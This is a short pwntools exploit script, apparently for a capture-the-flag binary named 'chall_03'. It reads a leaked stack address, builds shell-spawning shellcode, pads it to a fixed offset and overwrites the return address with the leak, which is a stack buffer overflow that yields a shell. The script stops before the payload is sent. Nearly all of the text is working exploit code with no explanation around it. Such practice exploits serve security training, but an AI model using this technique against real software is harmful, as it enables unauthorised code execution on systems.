from pwn import *

context.arch = 'amd64'
p = process('./chall_03')

p.recvuntil(b':) ')

leak = int(p.recvline().strip(), 16)

offset = 0x140 + 0x8

shellcode = asm(shellcraft.sh())

payload = shellcode + cyclic(offset - len(shellcode)) + p64(leak)
